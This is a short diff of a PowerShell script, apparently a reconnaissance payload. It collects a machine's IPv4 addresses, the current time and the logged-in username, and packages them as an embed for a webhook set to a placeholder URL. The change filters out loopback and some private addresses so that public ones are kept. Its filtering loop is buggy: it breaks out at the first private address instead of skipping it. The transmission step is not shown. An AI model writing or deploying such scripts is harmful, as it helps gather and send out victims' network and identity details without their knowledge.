@@ -1,6 +1,14 @@
 $webhookUrl = "WEBHOOK"
-$content = (Get-NetIPAddress -AddressFamily IPV4).IPAddress | Format-Table -AutoSize | Out-String
-$content = $content+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
+$content = (Get-NetIPAddress -AddressFamily IPV4).IPAddress
+$blank=$content.Split(" ")
+$ips = @()
+foreach ($thing in $blank) {
+    if ($thing -eq '127.0.0.1') {break}
+    if ($thing.substring(0,8) -eq '192.168.') {break}
+    if ($thing.substring(0,3) -eq '10.') {break}
+    else {$ips=$ips+$thing+"`n"}
+}
+$content = $ips+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
 [System.Collections.ArrayList]$embedArray = @()
 $title       = 'IP Address Powershell'
 $description = '```'+$content+'```'
